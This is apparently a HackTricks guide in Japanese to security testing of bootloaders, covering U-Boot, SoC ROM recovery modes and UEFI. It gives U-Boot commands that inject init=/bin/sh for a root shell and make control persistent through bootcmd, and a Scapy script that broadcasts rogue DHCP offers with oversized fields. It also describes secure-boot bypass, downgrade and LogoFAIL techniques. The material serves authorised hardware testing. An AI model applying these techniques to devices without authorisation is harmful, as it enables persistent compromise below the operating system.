# ブートローダーのテスト

{{#include ../../banners/hacktricks-training.md}}

以下の手順は、デバイスの起動設定を変更し、U-Boot や UEFI クラスのブートローダをテストする際に推奨されます。早期のコード実行を得ること、署名／ロールバック保護を評価すること、リカバリやネットワークブート経路を悪用することに注力してください。

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot：クイックウィンと環境の悪用

1. インタプリタシェルへアクセス
- 起動中に既知のブレークキー（多くの場合は任意のキー、0、スペース、またはボード固有の「マジック」シーケンス）を `bootcmd` が実行される前に押して、U-Boot プロンプトに落とします。

2. ブート状態と変数の確認
- 有用なコマンド:
- `printenv` (環境をダンプ)
- `bdinfo` (ボード情報、メモリアドレス)
- `help bootm; help booti; help bootz` (サポートされるカーネル起動方法)
- `help ext4load; help fatload; help tftpboot` (利用可能なローダ)

3. root シェルを得るための boot 引数の変更
- カーネルが通常の init の代わりにシェルを落とすように `init=/bin/sh` を追加:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. 自分の TFTP サーバからの Netboot
- ネットワークを設定して LAN からカーネル／fit イメージを取得:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. 環境経由での永続化
- env ストレージが書き込み保護されていなければ、制御を永続化できます:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- フォールバック経路に影響する `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` のような変数を確認してください。誤設定された値はシェルへの繰り返しの侵入を許すことがあります。

6. デバッグ／危険な機能の確認
- 次を探します: `bootdelay` > 0、`autoboot` 無効、制限のない `usb start; fatload usb 0:1 ...`、シリアル経由での `loady`/`loads` の能力、信頼できないメディアからの `env import`、および署名チェックなしでロードされるカーネル／ramdisk。

7. U-Boot イメージ／検証のテスト
- プラットフォームが FIT イメージでの secure/verified boot を主張している場合、未署名や改竄したイメージを試してください:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` が欠如しているか、古い `verify=n` の挙動があると、任意のペイロードをブートできることが多いです。

## ネットワークブート面 (DHCP/PXE) と悪意あるサーバ

8. PXE/DHCP パラメータのファジング
- U-Boot のレガシーな BOOTP/DHCP 処理はメモリ安全性の問題を抱えてきました。例えば CVE‑2024‑42040 は、細工された DHCP レスポンスを介して U-Boot メモリからバイトを回線上へ leak させるメモリ情報漏洩を記述しています。netboot 時にブートパラメータのコードパスを長すぎる／エッジケースの値（option 67 bootfile-name、vendor options、file/servername フィールド）で検査し、ハングや leak の有無を観察してください。
- netboot のブートパラメータを強要する最小限の Scapy スニペット:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- また、PXE ファイル名フィールドが OS 側プロビジョニングスクリプトに連鎖された際に、サニタイズされずにシェル／ローダロジックへ渡されるかを検証してください。

9. 不正な DHCP サーバによるコマンド注入のテスト
- 不正な DHCP/PXE サービスを立て、ファイル名やオプションフィールドに文字を注入してブートチェーンの後段でコマンドインタプリタに到達する試みを行います。Metasploit の DHCP auxiliary、`dnsmasq`、またはカスタム Scapy スクリプトが有用です。まずラボネットワークを分離してください。

## SoC ROM リカバリモード（通常の起動を上書き）

多くの SoC は BootROM の「loader」モードを公開しており、フラッシュイメージが無効でも USB/UART 経由でコードを受け付けます。secure-boot の fuse が焼かれていない場合、これはチェーン中で非常に早期の任意コード実行を提供する可能性があります。

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

デバイスに secure-boot 用の eFuses/OTP が焼かれているかを評価してください。もしそうでなければ、BootROM のダウンロードモードはしばしば上位レベルの検証（U-Boot、カーネル、rootfs）をバイパスし、SRAM/DRAM から直接ファーストステージペイロードを実行します。

## UEFI/PCクラス ブートローダ：クイックチェック

10. ESP の改ざんとロールバックのテスト
- EFI System Partition (ESP) をマウントし、以下のようなローダコンポーネントを確認: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, ベンダーロゴのパス。
- Secure Boot の失効リスト (dbx) が最新でない場合、ダウングレードされたまたは既知の脆弱な署名済みブートコンポーネントでブートを試みてください。プラットフォームが古い shim/bootmanager をまだ信頼しているなら、ESP から自分のカーネルや `grub.cfg` をロードして永続化を得られることがよくあります。

11. ブートロゴのパースバグ（LogoFAIL クラス）
- いくつかの OEM/IBV ファームウェアは、DXE の画像パースで脆弱性がありました。攻撃者がベンダー固有パス（例: `\EFI\<vendor>\logo\*.bmp`）に細工した画像を置ける場合、Secure Boot が有効でも早期ブート時にコード実行が可能になることがあります。プラットフォームがユーザ提供のロゴを受け入れるか、それらのパスが OS から書き込み可能かをテストしてください。

## ハードウェア上の注意点

早期ブート中に SPI/NAND フラッシュに干渉する（例: 読み取りをバイパスするためのピンの接地など）場合は注意し、必ずフラッシュのデータシートを参照してください。タイミングを誤ったショートはデバイスやプログラマを破損する可能性があります。

## 備考と追加のヒント

- `env export -t ${loadaddr}` と `env import -t ${loadaddr}` を試して、環境ブロブを RAM とストレージ間で移動します。いくつかのプラットフォームは取り外し可能メディアから認証なしに env をインポートできる場合があります。
- extlinux.conf 経由でブートする Linux ベースのシステムに対しては、ブートパーティション上の `APPEND` 行を変更して `init=/bin/sh` や `rd.break` を注入するだけで、署名チェックが無ければ十分なことが多いです。
- userland に `fw_printenv/fw_setenv` がある場合、`/etc/fw_env.config` が実際の env ストレージと一致するかを検証してください。誤設定されたオフセットは間違った MTD 領域の読み書きを許してしまいます。

## 参考

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
